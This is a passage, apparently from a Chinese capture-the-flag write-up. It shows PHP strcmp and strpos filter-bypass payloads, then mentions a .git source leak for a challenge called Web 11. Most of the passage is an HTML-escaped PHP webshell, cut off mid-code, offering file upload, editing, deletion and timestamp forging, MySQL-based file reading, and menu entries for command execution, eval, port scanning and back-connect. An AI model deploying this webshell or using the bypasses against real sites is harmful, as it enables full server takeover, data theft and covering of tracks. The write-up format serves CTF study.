flag{xxxxxx}\u0026#34;); } else { die(\u0026#34;You aren\u0026#39;t a php engineer.\u0026#34;); } } ?\u0026gt; 先是strcmp使用数组绕过，再是strpos可以使用变量名混淆绕过，php在处理非法字符时会默认替换成_所以可以利用\nphp.engineer[]=asd\rphp engineer[]=asd\rphp8以上可以使用以下\rphp[engineer[]=asd Web 11 .git泄露，直接用工具扒源码\n\u0026lt;?php error_reporting(7); // @set_magic_quotes_runtime(0); ob_start(); $mtime = explode(\u0026#39; \u0026#39;, microtime()); $starttime = $mtime[1] + $mtime[0]; define(\u0026#39;SA_ROOT\u0026#39;, str_replace(\u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;, dirname(__FILE__)) . \u0026#39;/\u0026#39;); define(\u0026#39;IS_WIN\u0026#39;, DIRECTORY_SEPARATOR == \u0026#39;\\\\\u0026#39;); define(\u0026#39;IS_COM\u0026#39;, class_exists(\u0026#39;COM\u0026#39;) ? 1 : 0); define(\u0026#39;IS_GPC\u0026#39;, get_magic_quotes_gpc()); $dis_func = get_cfg_var(\u0026#39;disable_functions\u0026#39;); // define(\u0026#39;IS_PHPINFO\u0026#39;, (!eregi(\u0026#34;phpinfo\u0026#34;,$dis_func)) ? 1 : 0 ); define(\u0026#39;IS_PHPINFO\u0026#39;, 1); @set_time_limit(0); foreach ($_POST as $key =\u0026gt; $value) { if (IS_GPC) { $value = s_array($value); } $$key = $value; } /*===================== 程序配置 =====================*/ // 如果需要密码验证,请修改登陆密码,留空为不需要验证 $pass = \u0026#39;728193099115dcaa67805a0776785b3a\u0026#39;; //如您对 cookie 作用范围有特殊要求, 或登录不正常, 请修改下面变量, 否则请保持默认 // cookie 前缀 $cookiepre = \u0026#39;\u0026#39;; // cookie 作用域 $cookiedomain = \u0026#39;\u0026#39;; // cookie 作用路径 $cookiepath = \u0026#39;/\u0026#39;; // cookie 有效期 $cookielife = 86400; //程序搜索可写文件的类型 !$writabledb \u0026amp;\u0026amp; $writabledb = \u0026#39;php,cgi,pl,asp,inc,js,html,htm,jsp\u0026#39;; /*===================== 配置结束 =====================*/ $charsetdb = array(\u0026#39;\u0026#39;, \u0026#39;armscii8\u0026#39;, \u0026#39;ascii\u0026#39;, \u0026#39;big5\u0026#39;, \u0026#39;binary\u0026#39;, \u0026#39;cp1250\u0026#39;, \u0026#39;cp1251\u0026#39;, \u0026#39;cp1256\u0026#39;, \u0026#39;cp1257\u0026#39;, \u0026#39;cp850\u0026#39;, \u0026#39;cp852\u0026#39;, \u0026#39;cp866\u0026#39;, \u0026#39;cp932\u0026#39;, \u0026#39;dec8\u0026#39;, \u0026#39;euc-jp\u0026#39;, \u0026#39;euc-kr\u0026#39;, \u0026#39;gb2312\u0026#39;, \u0026#39;gbk\u0026#39;, \u0026#39;geostd8\u0026#39;, \u0026#39;greek\u0026#39;, \u0026#39;hebrew\u0026#39;, \u0026#39;hp8\u0026#39;, \u0026#39;keybcs2\u0026#39;, \u0026#39;koi8r\u0026#39;, \u0026#39;koi8u\u0026#39;, \u0026#39;latin1\u0026#39;, \u0026#39;latin2\u0026#39;, \u0026#39;latin5\u0026#39;, \u0026#39;latin7\u0026#39;, \u0026#39;macce\u0026#39;, \u0026#39;macroman\u0026#39;, \u0026#39;sjis\u0026#39;, \u0026#39;swe7\u0026#39;, \u0026#39;tis620\u0026#39;, \u0026#39;ucs2\u0026#39;, \u0026#39;ujis\u0026#39;, \u0026#39;utf8\u0026#39;); if ($charset == \u0026#39;utf8\u0026#39;) { header(\u0026#34;content-Type: text/html; charset=utf-8\u0026#34;); } elseif ($charset == \u0026#39;big5\u0026#39;) { header(\u0026#34;content-Type: text/html; charset=big5\u0026#34;); } elseif ($charset == \u0026#39;gbk\u0026#39;) { header(\u0026#34;content-Type: text/html; charset=gbk\u0026#34;); } elseif ($charset == \u0026#39;latin1\u0026#39;) { header(\u0026#34;content-Type: text/html; charset=iso-8859-2\u0026#34;); } elseif ($charset == \u0026#39;euc-kr\u0026#39;) { header(\u0026#34;content-Type: text/html; charset=euc-kr\u0026#34;); } elseif ($charset == \u0026#39;euc-jp\u0026#39;) { header(\u0026#34;content-Type: text/html; charset=euc-jp\u0026#34;); } $self = $_SERVER[\u0026#39;PHP_SELF\u0026#39;] ? $_SERVER[\u0026#39;PHP_SELF\u0026#39;] : $_SERVER[\u0026#39;SCRIPT_NAME\u0026#39;]; $timestamp = time(); /*===================== 身份验证 =====================*/ if ($action == \u0026#34;logout\u0026#34;) { scookie(\u0026#39;loginpass\u0026#39;, \u0026#39;\u0026#39;, -86400 * 365); @header(\u0026#39;Location: \u0026#39; . $self); exit; } if ($pass) { if ($action == \u0026#39;login\u0026#39;) { if ($pass == encode_pass($password)) { scookie(\u0026#39;loginpass\u0026#39;, encode_pass($password)); @header(\u0026#39;Location: \u0026#39; . $self); exit; } } if ($_COOKIE[\u0026#39;loginpass\u0026#39;]) { if ($_COOKIE[\u0026#39;loginpass\u0026#39;] != $pass) { loginpage(); } } else { loginpage(); } } /*===================== 验证结束 =====================*/ $errmsg = \u0026#39;\u0026#39;; !$action \u0026amp;\u0026amp; $action = \u0026#39;file\u0026#39;; // 查看PHPINFO if ($action == \u0026#39;phpinfo\u0026#39;) { if (IS_PHPINFO) { phpinfo(); exit; } else { $errmsg = \u0026#39;phpinfo() function has non-permissible\u0026#39;; } } // 下载文件 if ($doing == \u0026#39;downfile\u0026#39; \u0026amp;\u0026amp; $thefile) { if (!@file_exists($thefile)) { $errmsg = \u0026#39;The file you want Downloadable was nonexistent\u0026#39;; } else { $fileinfo = pathinfo($thefile); header(\u0026#39;Content-type: application/x-\u0026#39; . $fileinfo[\u0026#39;extension\u0026#39;]); header(\u0026#39;Content-Disposition: attachment; filename=\u0026#39; . $fileinfo[\u0026#39;basename\u0026#39;]); header(\u0026#39;Content-Length: \u0026#39; . filesize($thefile)); @readfile($thefile); exit; } } // 直接下载备份数据库 if ($doing == \u0026#39;backupmysql\u0026#39; \u0026amp;\u0026amp; !$saveasfile) { if (!$table) { $errmsg = \u0026#39;Please choose the table\u0026#39;; } else { $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport); $filename = basename($dbname . \u0026#39;.sql\u0026#39;); header(\u0026#39;Content-type: application/unknown\u0026#39;); header(\u0026#39;Content-Disposition: attachment; filename=\u0026#39; . $filename); foreach ($table as $k =\u0026gt; $v) { if ($v) { sqldumptable($v); } } mysql_close(); exit; } } // 通过MYSQL下载文件 if ($doing == \u0026#39;mysqldown\u0026#39;) { if (!$dbname) { $errmsg = \u0026#39;Please input dbname\u0026#39;; } else { $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport); if (!file_exists($mysqldlfile)) { $errmsg = \u0026#39;The file you want Downloadable was nonexistent\u0026#39;; } else { $result = q(\u0026#34;select load_file(\u0026#39;$mysqldlfile\u0026#39;);\u0026#34;); if (!$result) { q(\u0026#34;DROP TABLE IF EXISTS tmp_angel;\u0026#34;); q(\u0026#34;CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);\u0026#34;); //用时间戳来表示截断,避免出现读取自身或包含__angel_1111111111_eof__的文件时不完整的情况 q(\u0026#34;LOAD DATA LOCAL INFILE \u0026#39;\u0026#34; . addslashes($mysqldlfile) . \u0026#34;\u0026#39; INTO TABLE tmp_angel FIELDS TERMINATED BY \u0026#39;__angel_{$timestamp}_eof__\u0026#39; ESCAPED BY \u0026#39;\u0026#39; LINES TERMINATED BY \u0026#39;__angel_{$timestamp}_eof__\u0026#39;;\u0026#34;); $result = q(\u0026#34;select content from tmp_angel\u0026#34;); q(\u0026#34;DROP TABLE tmp_angel\u0026#34;); } $row = @mysql_fetch_array($result); if (!$row) { $errmsg = \u0026#39;Load file failed \u0026#39; . mysql_error(); } else { $fileinfo = pathinfo($mysqldlfile); header(\u0026#39;Content-type: application/x-\u0026#39; . $fileinfo[\u0026#39;extension\u0026#39;]); header(\u0026#39;Content-Disposition: attachment; filename=\u0026#39; . $fileinfo[\u0026#39;basename\u0026#39;]); header(\u0026#34;Accept-Length: \u0026#34; . strlen($row[0])); echo $row[0]; exit; } } } } ?\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=gbk\u0026#34;\u0026gt; \u0026lt;title\u0026gt; \u0026lt;?php echo $action . \u0026#39; - \u0026#39; . $_SERVER[\u0026#39;HTTP_HOST\u0026#39;]; ?\u0026gt; \u0026lt;/title\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; body, td { font: 12px Arial, Tahoma; line-height: 16px; } .input { font: 12px Arial, Tahoma; background: #fff; border: 1px solid #666; padding: 2px; height: 22px; } .area { font: 12px \u0026#39;Courier New\u0026#39;, Monospace; background: #fff; border: 1px solid #666; padding: 2px; } .bt { border-color: #b0b0b0; background: #3d3d3d; color: #ffffff; font: 12px Arial, Tahoma; height: 22px; } a { color: #00f; text-decoration: underline; } a:hover { color: #f00; text-decoration: none; } .alt1 td { border-top: 1px solid #fff; border-bottom: 1px solid #ddd; background: #f1f1f1; padding: 5px 15px 5px 5px; } .alt2 td { border-top: 1px solid #fff; border-bottom: 1px solid #ddd; background: #f9f9f9; padding: 5px 15px 5px 5px; } .focus td { border-top: 1px solid #fff; border-bottom: 1px solid #ddd; background: #ffffaa; padding: 5px 15px 5px 5px; } .head td { border-top: 1px solid #fff; border-bottom: 1px solid #ddd; background: #e9e9e9; padding: 5px 15px 5px 5px; font-weight: bold; } .head td span { font-weight: normal; } .infolist { padding: 10px; margin: 10px 0 20px 0; background: #F1F1F1; border: 1px solid #ddd; } form { margin: 0; padding: 0; } h2 { margin: 0; padding: 0; height: 24px; line-height: 24px; font-size: 14px; color: #5B686F; } ul.info li { margin: 0; color: #444; line-height: 24px; height: 24px; } u { text-decoration: none; color: #777; float: left; display: block; width: 150px; margin-right: 10px; } .drives { padding: 5px; } .drives span { margin: auto 7px; } \u0026lt;/style\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function CheckAll(form) { for (var i = 0; i \u0026lt; form.elements.length; i++) { var e = form.elements[i]; if (e.name != \u0026#39;chkall\u0026#39;) e.checked = form.chkall.checked; } } function $(id) { return document.getElementById(id); } function createdir() { var newdirname; newdirname = prompt(\u0026#39;Please input the directory name:\u0026#39;, \u0026#39;\u0026#39;); if (!newdirname) return; $(\u0026#39;createdir\u0026#39;).newdirname.value = newdirname; $(\u0026#39;createdir\u0026#39;).submit(); } function fileperm(pfile) { var newperm; newperm = prompt(\u0026#39;Current file:\u0026#39; + pfile + \u0026#39;\\nPlease input new attribute:\u0026#39;, \u0026#39;\u0026#39;); if (!newperm) return; $(\u0026#39;fileperm\u0026#39;).newperm.value = newperm; $(\u0026#39;fileperm\u0026#39;).pfile.value = pfile; $(\u0026#39;fileperm\u0026#39;).submit(); } function copyfile(sname) { var tofile; tofile = prompt(\u0026#39;Original file:\u0026#39; + sname + \u0026#39;\\nPlease input object file (fullpath):\u0026#39;, \u0026#39;\u0026#39;); if (!tofile) return; $(\u0026#39;copyfile\u0026#39;).tofile.value = tofile; $(\u0026#39;copyfile\u0026#39;).sname.value = sname; $(\u0026#39;copyfile\u0026#39;).submit(); } function rename(oldname) { var newfilename; newfilename = prompt(\u0026#39;Former file name:\u0026#39; + oldname + \u0026#39;\\nPlease input new filename:\u0026#39;, \u0026#39;\u0026#39;); if (!newfilename) return; $(\u0026#39;rename\u0026#39;).newfilename.value = newfilename; $(\u0026#39;rename\u0026#39;).oldname.value = oldname; $(\u0026#39;rename\u0026#39;).submit(); } function dofile(doing, thefile, m) { if (m \u0026amp;\u0026amp; !confirm(m)) { return; } $(\u0026#39;filelist\u0026#39;).doing.value = doing; if (thefile) { $(\u0026#39;filelist\u0026#39;).thefile.value = thefile; } $(\u0026#39;filelist\u0026#39;).submit(); } function createfile(nowpath) { var filename; filename = prompt(\u0026#39;Please input the file name:\u0026#39;, \u0026#39;\u0026#39;); if (!filename) return; opfile(\u0026#39;editfile\u0026#39;, nowpath + filename, nowpath); } function opfile(action, opfile, dir) { $(\u0026#39;fileopform\u0026#39;).action.value = action; $(\u0026#39;fileopform\u0026#39;).opfile.value = opfile; $(\u0026#39;fileopform\u0026#39;).dir.value = dir; $(\u0026#39;fileopform\u0026#39;).submit(); } function godir(dir, view_writable) { if (view_writable) { $(\u0026#39;godir\u0026#39;).view_writable.value = view_writable; } $(\u0026#39;godir\u0026#39;).dir.value = dir; $(\u0026#39;godir\u0026#39;).submit(); } function getsize(getdir, dir) { $(\u0026#39;getsize\u0026#39;).getdir.value = getdir; $(\u0026#39;getsize\u0026#39;).dir.value = dir; $(\u0026#39;getsize\u0026#39;).submit(); } function editrecord(action, base64, tablename) { if (action == \u0026#39;del\u0026#39;) { if (!confirm(\u0026#39;Is or isn\\\u0026#39;t deletion record?\u0026#39;)) return; } $(\u0026#39;recordlist\u0026#39;).doing.value = action; $(\u0026#39;recordlist\u0026#39;).base64.value = base64; $(\u0026#39;recordlist\u0026#39;).tablename.value = tablename; $(\u0026#39;recordlist\u0026#39;).submit(); } function moddbname(dbname) { if (!dbname) return; $(\u0026#39;setdbname\u0026#39;).dbname.value = dbname; $(\u0026#39;setdbname\u0026#39;).submit(); } function settable(tablename, doing, page) { if (!tablename) return; if (doing) { $(\u0026#39;settable\u0026#39;).doing.value = doing; } if (page) { $(\u0026#39;settable\u0026#39;).page.value = page; } $(\u0026#39;settable\u0026#39;).tablename.value = tablename; $(\u0026#39;settable\u0026#39;).submit(); } function s(action, nowpath, p1, p2, p3, p4, p5) { if (action) $(\u0026#39;opform\u0026#39;).action.value = action; if (nowpath) $(\u0026#39;opform\u0026#39;).nowpath.value = nowpath; if (p1) $(\u0026#39;opform\u0026#39;).p1.value = p1; if (p2) $(\u0026#39;opform\u0026#39;).p2.value = p2; if (p3) $(\u0026#39;opform\u0026#39;).p3.value = p3; if (p4) $(\u0026#39;opform\u0026#39;).p4.value = p4; if (p5) $(\u0026#39;opform\u0026#39;).p4.value = p5; } function g(action, nowpath, p1, p2, p3, p4, p5) { if (!action) return; s(action, nowpath, p1, p2, p3, p4, p5); $(\u0026#39;opform\u0026#39;).submit(); } \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body style=\u0026#34;margin:0;table-layout:fixed; word-break:break-all\u0026#34;\u0026gt; \u0026lt;?php formhead(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;opform\u0026#39;)); makehide(\u0026#39;action\u0026#39;, $action); makehide(\u0026#39;nowpath\u0026#39;, $nowpath); makehide(\u0026#39;p1\u0026#39;, $p1); makehide(\u0026#39;p2\u0026#39;, $p2); makehide(\u0026#39;p3\u0026#39;, $p3); makehide(\u0026#39;p4\u0026#39;, $p4); makehide(\u0026#39;p5\u0026#39;, $p5); formfoot(); if (!function_exists(\u0026#39;posix_getegid\u0026#39;)) { $user = @get_current_user(); $uid = @getmyuid(); $gid = @getmygid(); $group = \u0026#34;?\u0026#34;; } else { $uid = @posix_getpwuid(@posix_geteuid()); $gid = @posix_getgrgid(@posix_getegid()); $user = $uid[\u0026#39;name\u0026#39;]; $uid = $uid[\u0026#39;uid\u0026#39;]; $group = $gid[\u0026#39;name\u0026#39;]; $gid = $gid[\u0026#39;gid\u0026#39;]; } ?\u0026gt; \u0026lt;table width=\u0026#34;100%\u0026#34; border=\u0026#34;0\u0026#34; cellpadding=\u0026#34;0\u0026#34; cellspacing=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;tr class=\u0026#34;head\u0026#34;\u0026gt; \u0026lt;td\u0026gt;\u0026lt;span style=\u0026#34;float:right;\u0026#34;\u0026gt; \u0026lt;?php echo @php_uname(); ?\u0026gt; / User: \u0026lt;?php echo $uid . \u0026#39; ( \u0026#39; . $user . \u0026#39; ) / Group: \u0026#39; . $gid . \u0026#39; ( \u0026#39; . $group . \u0026#39; )\u0026#39;; ?\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;?php echo $_SERVER[\u0026#39;HTTP_HOST\u0026#39;]; ?\u0026gt; ( \u0026lt;?php echo gethostbyname($_SERVER[\u0026#39;SERVER_NAME\u0026#39;]); ?\u0026gt;) \u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr class=\u0026#34;alt1\u0026#34;\u0026gt; \u0026lt;td\u0026gt; \u0026lt;span style=\u0026#34;float:right;\u0026#34;\u0026gt;PHP \u0026lt;?php echo PHP_VERSION; ?\u0026gt; / Safe Mode: \u0026lt;?php echo getcfg(\u0026#39;safe_mode\u0026#39;); ?\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;a href=\u0026#34;javascript:g(\u0026#39;logout\u0026#39;);\u0026#34;\u0026gt;Logout\u0026lt;/a\u0026gt; | \u0026lt;a href=\u0026#34;javascript:g(\u0026#39;file\u0026#39;);\u0026#34;\u0026gt;File Manager\u0026lt;/a\u0026gt; | \u0026lt;a href=\u0026#34;javascript:g(\u0026#39;mysqladmin\u0026#39;);\u0026#34;\u0026gt;MYSQL Manager\u0026lt;/a\u0026gt; | \u0026lt;a href=\u0026#34;javascript:g(\u0026#39;sqlfile\u0026#39;);\u0026#34;\u0026gt;MySQL Upload \u0026amp; Download\u0026lt;/a\u0026gt; | \u0026lt;a href=\u0026#34;javascript:g(\u0026#39;shell\u0026#39;);\u0026#34;\u0026gt;Execute Command\u0026lt;/a\u0026gt; | \u0026lt;a href=\u0026#34;javascript:g(\u0026#39;phpenv\u0026#39;);\u0026#34;\u0026gt;PHP Variable\u0026lt;/a\u0026gt; | \u0026lt;a href=\u0026#34;javascript:g(\u0026#39;portscan\u0026#39;);\u0026#34;\u0026gt;Port Scan\u0026lt;/a\u0026gt; | \u0026lt;a href=\u0026#34;javascript:g(\u0026#39;secinfo\u0026#39;);\u0026#34;\u0026gt;Security information\u0026lt;/a\u0026gt; | \u0026lt;a href=\u0026#34;javascript:g(\u0026#39;eval\u0026#39;);\u0026#34;\u0026gt;Eval PHP Code\u0026lt;/a\u0026gt; \u0026lt;?php if (!IS_WIN) { ?\u0026gt; | \u0026lt;a href=\u0026#34;javascript:g(\u0026#39;backconnect\u0026#39;);\u0026#34;\u0026gt;Back Connect\u0026lt;/a\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;table width=\u0026#34;100%\u0026#34; border=\u0026#34;0\u0026#34; cellpadding=\u0026#34;15\u0026#34; cellspacing=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt; \u0026lt;?php $errmsg \u0026amp;\u0026amp; m($errmsg); // 获取当前路径 if (!$dir) { $dir = $_SERVER[\u0026#34;DOCUMENT_ROOT\u0026#34;] ? $_SERVER[\u0026#34;DOCUMENT_ROOT\u0026#34;] : \u0026#39;.\u0026#39;; } $nowpath = getPath(SA_ROOT, $dir); if (substr($dir, -1) != \u0026#39;/\u0026#39;) { $dir = $dir . \u0026#39;/\u0026#39;; } if ($action == \u0026#39;file\u0026#39;) { // 判断读写情况 $dir_writeable = @is_writable($nowpath) ? \u0026#39;Writable\u0026#39; : \u0026#39;Non-writable\u0026#39;; // 创建目录 if ($newdirname) { $mkdirs = $nowpath . $newdirname; if (file_exists($mkdirs)) { m(\u0026#39;Directory has already existed\u0026#39;); } else { m(\u0026#39;Directory created \u0026#39; . (@mkdir($mkdirs, 0777) ? \u0026#39;success\u0026#39; : \u0026#39;failed\u0026#39;)); @chmod($mkdirs, 0777); } } // 上传文件 elseif ($doupfile) { m(\u0026#39;File upload \u0026#39; . (@copy($_FILES[\u0026#39;uploadfile\u0026#39;][\u0026#39;tmp_name\u0026#39;], $uploaddir . \u0026#39;/\u0026#39; . $_FILES[\u0026#39;uploadfile\u0026#39;][\u0026#39;name\u0026#39;]) ? \u0026#39;success\u0026#39; : \u0026#39;failed\u0026#39;)); } // 编辑文件 elseif ($editfilename \u0026amp;\u0026amp; $filecontent) { $fp = @fopen($editfilename, \u0026#39;w\u0026#39;); m(\u0026#39;Save file \u0026#39; . (@fwrite($fp, $filecontent) ? \u0026#39;success\u0026#39; : \u0026#39;failed\u0026#39;)); @fclose($fp); } // 编辑文件属性 elseif ($pfile \u0026amp;\u0026amp; $newperm) { if (!file_exists($pfile)) { m(\u0026#39;The original file does not exist\u0026#39;); } else { $newperm = base_convert($newperm, 8, 10); m(\u0026#39;Modify file attributes \u0026#39; . (@chmod($pfile, $newperm) ? \u0026#39;success\u0026#39; : \u0026#39;failed\u0026#39;)); } } // 改名 elseif ($oldname \u0026amp;\u0026amp; $newfilename) { $nname = $nowpath . $newfilename; if (file_exists($nname) || !file_exists($oldname)) { m($nname . \u0026#39; has already existed or original file does not exist\u0026#39;); } else { m(basename($oldname) . \u0026#39; renamed \u0026#39; . basename($nname) . (@rename($oldname, $nname) ? \u0026#39; success\u0026#39; : \u0026#39;failed\u0026#39;)); } } // 复制文件 elseif ($sname \u0026amp;\u0026amp; $tofile) { if (file_exists($tofile) || !file_exists($sname)) { m(\u0026#39;The goal file has already existed or original file does not exist\u0026#39;); } else { m(basename($tofile) . \u0026#39; copied \u0026#39; . (@copy($sname, $tofile) ? basename($tofile) . \u0026#39; success\u0026#39; : \u0026#39;failed\u0026#39;)); } } // 克隆时间 elseif ($curfile \u0026amp;\u0026amp; $tarfile) { if (!@file_exists($curfile) || !@file_exists($tarfile)) { m(\u0026#39;The goal file has already existed or original file does not exist\u0026#39;); } else { $time = @filemtime($tarfile); m(\u0026#39;Modify file the last modified \u0026#39; . (@touch($curfile, $time, $time) ? \u0026#39;success\u0026#39; : \u0026#39;failed\u0026#39;)); } } // 自定义时间 elseif ($curfile \u0026amp;\u0026amp; $year \u0026amp;\u0026amp; $month \u0026amp;\u0026amp; $day \u0026amp;\u0026amp; $hour \u0026amp;\u0026amp; $minute \u0026amp;\u0026amp; $second) { if (!@file_exists($curfile)) { m(basename($curfile) . \u0026#39; does not exist\u0026#39;); } else { $time = strtotime(\u0026#34;$year-$month-$day $hour:$minute:$second\u0026#34;); m(\u0026#39;Modify file the last modified \u0026#39; . (@touch($curfile, $time, $time) ? \u0026#39;success\u0026#39; : \u0026#39;failed\u0026#39;)); } } // 批量删除文件 elseif ($doing == \u0026#39;delfiles\u0026#39;) { if ($dl) { $dfiles = \u0026#39;\u0026#39;; $succ = $fail = 0; foreach ($dl as $filepath) { if (is_dir($filepath)) { if (@deltree($filepath)) { $succ++; } else { $fail++; } } else { if (@unlink($filepath)) { $succ++; } else { $fail++; } } } m(\u0026#39;Deleted folder/file have finished,choose \u0026#39; . count($dl) . \u0026#39; success \u0026#39; . $succ . \u0026#39; fail \u0026#39; . $fail); } else { m(\u0026#39;Please select folder/file(s)\u0026#39;); } } //操作完毕 formhead(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;createdir\u0026#39;)); makehide(\u0026#39;newdirname\u0026#39;); makehide(\u0026#39;dir\u0026#39;, $nowpath); formfoot(); formhead(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;fileperm\u0026#39;)); makehide(\u0026#39;newperm\u0026#39;); makehide(\u0026#39;pfile\u0026#39;); makehide(\u0026#39;dir\u0026#39;, $nowpath); formfoot(); formhead(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;copyfile\u0026#39;)); makehide(\u0026#39;sname\u0026#39;); makehide(\u0026#39;tofile\u0026#39;); makehide(\u0026#39;dir\u0026#39;, $nowpath); formfoot(); formhead(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;rename\u0026#39;)); makehide(\u0026#39;oldname\u0026#39;); makehide(\u0026#39;newfilename\u0026#39;); makehide(\u0026#39;dir\u0026#39;, $nowpath); formfoot(); formhead(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;fileopform\u0026#39;, \u0026#39;target\u0026#39; =\u0026gt; \u0026#39;_blank\u0026#39;)); makehide(\u0026#39;action\u0026#39;); makehide(\u0026#39;opfile\u0026#39;); makehide(\u0026#39;dir\u0026#39;); formfoot(); formhead(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;getsize\u0026#39;)); makehide(\u0026#39;getdir\u0026#39;); makehide(\u0026#39;dir\u0026#39;); formfoot(); $free = @disk_free_space($nowpath); !$free \u0026amp;\u0026amp; $free = 0; $all = @disk_total_space($nowpath); !$all \u0026amp;\u0026amp; $all = 0; $used = $all - $free; p(\u0026#39;\u0026lt;h2\u0026gt;File Manager - Current disk free \u0026#39; . sizecount($free) . \u0026#39; of \u0026#39; . sizecount($all) . \u0026#39; (\u0026#39; . @round(100 / ($all / $free), 2) . \u0026#39;%)\u0026lt;/h2\u0026gt;\u0026#39;); $cwd_links = \u0026#39;\u0026#39;; $path = explode(\u0026#39;/\u0026#39;, $nowpath); $n = count($path); for ($i = 0; $i \u0026lt; $n - 1; $i++) { $cwd_links .= \u0026#39;\u0026lt;a href=\u0026#34;javascript:godir(\\\u0026#39;\u0026#39;; for ($j = 0; $j \u0026lt;= $i; $j++) { $cwd_links .= $path[$j] . \u0026#39;/\u0026#39;; } $cwd_links .= \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;\u0026#39; . $path[$i] . \u0026#39;/\u0026lt;/a\u0026gt;\u0026#39;; } ?\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; document.onclick = shownav; function shownav(e) { var src = e ? e.target : event.srcElement; do { if (src.id == \u0026#34;jumpto\u0026#34;) { $(\u0026#39;inputnav\u0026#39;).style.display = \u0026#34;\u0026#34;; $(\u0026#39;pathnav\u0026#39;).style.display = \u0026#34;none\u0026#34;; //hidenav(); return; } if (src.id == \u0026#34;inputnav\u0026#34;) { return; } src = src.parentNode; } while (src.parentNode) $(\u0026#39;inputnav\u0026#39;).style.display = \u0026#34;none\u0026#34;; $(\u0026#39;pathnav\u0026#39;).style.display = \u0026#34;\u0026#34;; } \u0026lt;/script\u0026gt; \u0026lt;div style=\u0026#34;background:#eee;margin-bottom:10px;\u0026#34;\u0026gt; \u0026lt;table id=\u0026#34;pathnav\u0026#34; width=\u0026#34;100%\u0026#34; border=\u0026#34;0\u0026#34; cellpadding=\u0026#34;5\u0026#34; cellspacing=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td width=\u0026#34;100%\u0026#34;\u0026gt; \u0026lt;?php echo $cwd_links . \u0026#39; - \u0026#39; . getChmod($nowpath) . \u0026#39; / \u0026#39; . getPerms($nowpath) . getUser($nowpath); ?\u0026gt; ( \u0026lt;?php echo $dir_writeable; ?\u0026gt;) \u0026lt;/td\u0026gt; \u0026lt;td nowrap\u0026gt;\u0026lt;input class=\u0026#34;bt\u0026#34; id=\u0026#34;jumpto\u0026#34; name=\u0026#34;jumpto\u0026#34; value=\u0026#34;Jump to\u0026#34; type=\u0026#34;button\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;table id=\u0026#34;inputnav\u0026#34; width=\u0026#34;100%\u0026#34; border=\u0026#34;0\u0026#34; cellpadding=\u0026#34;5\u0026#34; cellspacing=\u0026#34;0\u0026#34; style=\u0026#34;display:none;\u0026#34;\u0026gt; \u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34; id=\u0026#34;godir\u0026#34; name=\u0026#34;godir\u0026#34;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td nowrap\u0026gt;Current Directory ( \u0026lt;?php echo $dir_writeable; ?\u0026gt;, \u0026lt;?php echo getChmod($nowpath); ?\u0026gt;) \u0026lt;/td\u0026gt; \u0026lt;td width=\u0026#34;100%\u0026#34;\u0026gt;\u0026lt;input name=\u0026#34;view_writable\u0026#34; value=\u0026#34;0\u0026#34; type=\u0026#34;hidden\u0026#34; /\u0026gt;\u0026lt;input class=\u0026#34;input\u0026#34; name=\u0026#34;dir\u0026#34; value=\u0026#34;\u0026lt;?php echo $nowpath; ?\u0026gt;\u0026#34; type=\u0026#34;text\u0026#34; style=\u0026#34;width:99%;margin:0 8px;\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td nowrap\u0026gt;\u0026lt;input class=\u0026#34;bt\u0026#34; value=\u0026#34;GO\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;?php if (IS_WIN \u0026amp;\u0026amp; IS_COM) { $obj = new COM(\u0026#39;scripting.filesystemobject\u0026#39;); if ($obj \u0026amp;\u0026amp; is_object($obj) \u0026amp;\u0026amp; $obj-\u0026gt;Drives) { echo \u0026#39;\u0026lt;div class=\u0026#34;drives\u0026#34;\u0026gt;\u0026#39;; $DriveTypeDB = array(0 =\u0026gt; \u0026#39;Unknow\u0026#39;, 1 =\u0026gt; \u0026#39;Removable\u0026#39;, 2 =\u0026gt; \u0026#39;Fixed\u0026#39;, 3 =\u0026gt; \u0026#39;Network\u0026#39;, 4 =\u0026gt; \u0026#39;CDRom\u0026#39;, 5 =\u0026gt; \u0026#39;RAM Disk\u0026#39;); $comma = \u0026#39;\u0026#39;; foreach ($obj-\u0026gt;Drives as $drive) { if ($drive-\u0026gt;Path) { p($comma . \u0026#39;\u0026lt;a href=\u0026#34;javascript:godir(\\\u0026#39;\u0026#39; . $drive-\u0026gt;Path . \u0026#39;/\\\u0026#39;);\u0026#34;\u0026gt;\u0026#39; . $DriveTypeDB[$drive-\u0026gt;DriveType] . \u0026#39;(\u0026#39; . 